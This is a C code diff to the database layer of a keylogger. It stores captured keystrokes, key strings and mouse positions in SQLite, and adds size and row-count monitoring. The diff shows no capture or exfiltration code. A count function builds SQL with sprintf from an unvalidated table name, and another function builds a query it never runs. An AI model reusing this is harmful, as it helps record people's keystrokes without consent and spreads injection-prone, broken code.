@@ -3,7 +3,9 @@
 #include "log.h/log.h"
 #include <assert.h>
 ////////////////////////////////////////////////////////
-static struct sqldbal_db *db;
+static struct sqldbal_db      *db;
+static volatile unsigned long last_qty_checks = 0, last_qty_check_ts = 0, check_qty_interval_ms = 5000;
+static volatile size_t        recorded_qty = 0, inserted_events_qty = 0, table_size_bytes = 0;
 #define ASSERT_SQLDB_RESULT()          \
   { do {                               \
       assert(rc == SQLDBAL_STATUS_OK); \
@@ -25,13 +27,12 @@ static struct sqldbal_db *db;
 
 
 int keylogger_db_delete(void){
-  db_statement_t           db_st = NEW_DB_STATEMENT();
-  enum sqldbal_status_code rc;
+  db_statement_t db_st = NEW_DB_STATEMENT();
 
-  rc = sqldbal_stmt_prepare(db,
-                            "DELETE FROM events",
-                            -1,
-                            &db_st.stmt);
+  db_st.rc = sqldbal_stmt_prepare(db,
+                                  "DELETE FROM events",
+                                  -1,
+                                  &db_st.stmt);
   EXEC_AND_ASSERT_DB_STATEMENT(db_st);
   return(0);
 }
@@ -71,6 +72,64 @@ int keylogger_init_db(void){
 }
 
 
+size_t keylogger_get_db_size(){
+  int64_t        page_size = 0, page_count = 0, size_bytes = 0;
+  char           sql0[] = "PRAGMA PAGE_SIZE", sql1[] = "PRAGMA PAGE_COUNT";
+  db_statement_t db_st = NEW_DB_STATEMENT();
+
+  db_st.rc = sqldbal_stmt_prepare(db, sql0, -1, &db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  EXEC_AND_ASSERT_DB_STATEMENT(db_st);
+  while (sqldbal_stmt_fetch(db_st.stmt) == SQLDBAL_FETCH_ROW) {
+    db_st.rc = sqldbal_stmt_column_int64(db_st.stmt, 0, &page_size);
+    ASSERT_DB_STATEMENT(db_st);
+  }
+  db_st.rc = sqldbal_stmt_close(db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  db_st.rc = sqldbal_stmt_prepare(db, sql1, -1, &db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  EXEC_AND_ASSERT_DB_STATEMENT(db_st);
+  while (sqldbal_stmt_fetch(db_st.stmt) == SQLDBAL_FETCH_ROW) {
+    db_st.rc = sqldbal_stmt_column_int64(db_st.stmt, 0, &page_count);
+    ASSERT_DB_STATEMENT(db_st);
+  }
+  db_st.rc = sqldbal_stmt_close(db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  size_bytes = (page_size * page_count);
+  return(size_bytes);
+}
+
+
+size_t keylogger_get_table_sql(const char *TABLE){
+  db_statement_t db_st = NEW_DB_STATEMENT();
+  char           *sql  = malloc(1024);
+
+  sprintf(sql, "SELECT sql FROM sqlite_master WHERE name='%s'", TABLE);
+  free(sql);
+  return(db_st.qty);
+}
+
+
+size_t keylogger_count_table_rows(const char *TABLE){
+  db_statement_t db_st = NEW_DB_STATEMENT();
+  char           *sql  = malloc(1024);
+
+  sprintf(sql, "SELECT COUNT(*) FROM %s", TABLE);
+  db_st.rc = sqldbal_stmt_prepare(db, sql, -1, &db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  EXEC_AND_ASSERT_DB_STATEMENT(db_st);
+  while (sqldbal_stmt_fetch(db_st.stmt) == SQLDBAL_FETCH_ROW) {
+    db_st.rc = sqldbal_stmt_column_int64(db_st.stmt, 0, &db_st.qty);
+    ASSERT_DB_STATEMENT(db_st);
+  }
+  db_st.rc = sqldbal_stmt_close(db_st.stmt);
+  ASSERT_DB_STATEMENT(db_st);
+  last_qty_checks++;
+  free(sql);
+  return(db_st.qty);
+}
+
+
 int keylogger_select_db(void){
   db_statement_t db_st = NEW_DB_STATEMENT();
 
@@ -80,32 +139,41 @@ int keylogger_select_db(void){
                                   &db_st.stmt);
   ASSERT_DB_STATEMENT(db_st);
   EXEC_AND_ASSERT_DB_STATEMENT(db_st);
+  ASSERT_DB_STATEMENT(db_st);
   while (sqldbal_stmt_fetch(db_st.stmt) == SQLDBAL_FETCH_ROW) {
     db_st.rc = sqldbal_stmt_column_int64(db_st.stmt, 0, &db_st.qty);
     ASSERT_DB_STATEMENT(db_st);
-    printf(
-      AC_RESETALL AC_YELLOW ">%llu event rows\n" AC_RESETALL,
-      db_st.qty
-      );
   }
   db_st.rc = sqldbal_stmt_close(db_st.stmt);
   ASSERT_DB_STATEMENT(db_st);
+  recorded_qty = db_st.qty;
   return(0);
 }
 
 
 int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
+  if (DEBUG_LOGGED_EVENTS) {
+    log_debug(
+      AC_RESETALL "last recorded_qty check ts:%lu (%llums ago)" AC_RESETALL
+      "\n\t|%lu checks| %lu records|%s Database|",
+      last_qty_check_ts, (long long)(timestamp() - last_qty_check_ts),
+      last_qty_checks, recorded_qty,
+      bytes_to_string(table_size_bytes)
+      );
+    log_debug("ts:%lu", LOGGED_EVENT->ts);
+    log_debug("kc:%lu", LOGGED_EVENT->key_code);
+    log_debug("ks:%s", LOGGED_EVENT->key_string);
+    log_debug("type:%s", LOGGED_EVENT->input_type);
+    log_debug("mouse:%lux%lu", LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y);
+  }
   db_statement_t db_st = NEW_DB_STATEMENT();
-  int64_t        ins_id;
+  if (((long long)(timestamp() - last_qty_check_ts) > check_qty_interval_ms)) {
+    recorded_qty      = keylogger_count_table_rows("events");
+    table_size_bytes  = keylogger_get_db_size();
+    last_qty_check_ts = timestamp();
+  }
 
   for (size_t i = 0; i < LOGGED_EVENT->qty; i++) {
-    if (DEBUG_LOGGED_EVENTS) {
-      log_debug("ts:%lu", LOGGED_EVENT->ts);
-      log_debug("kc:%lu", LOGGED_EVENT->key_code);
-      log_debug("ks:%s", LOGGED_EVENT->key_string);
-      log_debug("type:%s", LOGGED_EVENT->input_type);
-      log_debug("mouse:%lux%lu", LOGGED_EVENT->mouse_x, LOGGED_EVENT->mouse_y);
-    }
     db_st.rc = sqldbal_stmt_prepare(db,
                                     "INSERT INTO events\
       (ts, key_code, key_string, action, mouse_x, mouse_y, input_type) \
@@ -130,13 +198,12 @@ int keylogger_insert_db_row(logged_key_event_t *LOGGED_EVENT){
     db_st.rc = sqldbal_stmt_bind_text(db_st.stmt, 6, LOGGED_EVENT->input_type, -1);
     ASSERT_DB_STATEMENT(db_st);
     EXEC_AND_ASSERT_DB_STATEMENT(db_st);
-
-    ins_id   = -1;
-    db_st.rc = sqldbal_last_insert_id(db, "events_id_seq", &ins_id);
+    db_st.rc = sqldbal_last_insert_id(db, "events_id_seq", &db_st.inserted_id);
     ASSERT_DB_STATEMENT(db_st);
     db_st.rc = sqldbal_stmt_close(db_st.stmt);
     ASSERT_DB_STATEMENT(db_st);
-    log_debug("inserted row #%lu", (size_t)ins_id);
+    //log_debug("inserted row #%lu", (size_t)db_st.inserted_id);
+    inserted_events_qty++;
   }
   return(0);
 } /* keylogger_insert_db_row */
